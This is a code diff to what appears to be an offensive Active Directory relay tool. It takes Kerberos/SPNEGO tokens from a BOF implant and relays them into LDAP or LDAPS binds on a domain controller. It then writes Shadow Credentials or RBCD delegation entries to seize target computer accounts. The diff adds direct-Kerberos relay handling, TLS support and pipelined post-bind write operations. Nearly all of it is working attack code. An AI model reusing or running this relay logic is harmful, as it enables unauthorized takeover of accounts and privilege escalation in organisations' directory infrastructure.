@@ -1210,6 +1210,23 @@ def collect_shadow_candidates(
         raise RelayError("queued ShadowCred exchange returned no successful KCL write")
 
 
+def send_ldap_operations(
+    ldap: RawLdapConnection, requests: list[tuple[int, bytes]],
+) -> list[tuple[int, int]]:
+    """Send ordinary operations after a Kerberos bind with no SASL layer."""
+    packet = bytearray()
+    ids = []
+    for operation_tag, body in requests:
+        ldap.message_id += 1
+        ids.append((ldap.message_id, 0x65 if operation_tag == 0x63 else operation_tag + 1))
+        packet.extend(ber_tlv(
+            0x30,
+            ber_integer(ldap.message_id) + ber_tlv(operation_tag, body),
+        ))
+    ldap.sock.sendall(packet)
+    return ids
+
+
 def run_ldap_session(channel: RecordChannel, options: argparse.Namespace):
     """Relay one LDAP SASL exchange and apply its selected directory action."""
     log = (lambda message: print(f"[*] {message}", flush=True)) if options.verbose else (lambda message: None)
@@ -1221,26 +1238,36 @@ def run_ldap_session(channel: RecordChannel, options: argparse.Namespace):
         prepare_rbcd_pipeline(options)
         if options.mode == "rbcd" and options.delegate_sid else None
     )
-    log(f"Opening one persistent TCP connection to {options.ldap_address}:{options.ldap_port} for ldap/{options.ldap_host}")
+    transport = "TLS" if options.ldap_tls else "TCP"
+    log(f"Opening one persistent {transport} connection to {options.ldap_address}:{options.ldap_port} for ldap/{options.ldap_host}")
     ldap = RawLdapConnection(
         options.ldap_address,
         options.ldap_port,
-        None,
-        None,
+        options.ldap_host if options.ldap_tls else None,
     )
     try:
         leg = 0
+        source_direct_kerberos = False
         while True:
             kind, token = channel.receive({MSG_CLIENT_AUTH_TOKEN, MSG_ERROR})
             if kind == MSG_ERROR:
                 raise RelayError("BOF rejected relay continuation: " + token.decode("utf-8", errors="replace"))
             leg += 1
+            if leg == 1:
+                source_direct_kerberos = token.startswith(b"\x6e")
             log(f"Received opaque SPNEGO leg {leg}; sending an LDAP SASL GSS-SPNEGO BindRequest")
             pipelined_ids = []
             pipeline_bundle = None
             pipeline_target = None
             pipeline_rbcd = None
-            if leg == 2 and options.mode == "shadowcred":
+            post_bind_requests = None
+            if leg == 2 and source_direct_kerberos:
+                if options.mode == "shadowcred":
+                    post_bind_requests, pipeline_bundle, pipeline_target = prepared_shadow
+                else:
+                    post_bind_requests, pipeline_rbcd = prepared_rbcd
+                response = ldap.bind(ldap_kerberos_token(token, leg))
+            elif leg == 2 and options.mode == "shadowcred":
                 requests, pipeline_bundle, pipeline_target = prepared_shadow
                 response, pipelined_ids = ldap.bind_with_prefetched_requests(
                     ldap_kerberos_token(token, leg), requests
@@ -1259,13 +1286,37 @@ def run_ldap_session(channel: RecordChannel, options: argparse.Namespace):
             if response.result_code == 14:  # saslBindInProgress
                 if not response.server_credentials:
                     raise RelayError("LDAP requested SASL continuation without serverSaslCreds")
-                continuation = ldap_rpc_continuation(response.server_credentials)
+                continuation = (
+                    response.server_credentials
+                    if source_direct_kerberos else
+                    ldap_rpc_continuation(response.server_credentials)
+                )
                 channel.send(MSG_SERVER_AUTH_TOKEN, continuation)
                 continue
             if response.result_code != 0:
                 detail = f": {response.diagnostic}" if response.diagnostic else ""
                 raise RelayError(f"LDAP SASL bind failed with result {response.result_code}{detail}")
             log("LDAP final bind succeeded; validating the queued directory write")
+            if post_bind_requests is not None:
+                operation_ids = send_ldap_operations(ldap, post_bind_requests)
+                if pipeline_bundle:
+                    collect_shadow_candidates(ldap, operation_ids, log)
+                    print(
+                        f"[+] Added Shadow Credential to {pipeline_target} over "
+                        f"{'LDAPS' if options.ldap_tls else 'LDAP'}", flush=True,
+                    )
+                    channel.send(MSG_AUTH_OK)
+                    channel.bof_released = True
+                    return pipeline_bundle
+                collect_pipelined_attack(ldap, operation_ids, log)
+                print(
+                    f"[+] RBCD delegate added over {'LDAPS' if options.ldap_tls else 'LDAP'}: "
+                    f"{pipeline_rbcd.delegate} "
+                    f"({pipeline_rbcd.sid}) -> {pipeline_rbcd.target}", flush=True,
+                )
+                channel.send(MSG_AUTH_OK)
+                channel.bof_released = True
+                return pipeline_rbcd
             if pipelined_ids:
                 if pipeline_bundle:
                     collect_shadow_candidates(ldap, pipelined_ids, log)
@@ -1391,6 +1442,7 @@ def parse_args(argv: list[str]) -> argparse.Namespace:
         target.add_argument("--ldap-host", required=True, help="LDAP SPN hostname")
         target.add_argument("--ldap-address", required=True, help="DC address reached through proxychains")
         target.add_argument("--ldap-port", type=int, default=389)
+        target.add_argument("--ldap-tls", action="store_true", help="wrap direct LDAP in TLS")
         target.add_argument("--target-dn", dest="ldap_target_dn", required=True, help="exact target computer DN")
 
     actions = parser.add_subparsers(dest="action", required=True)
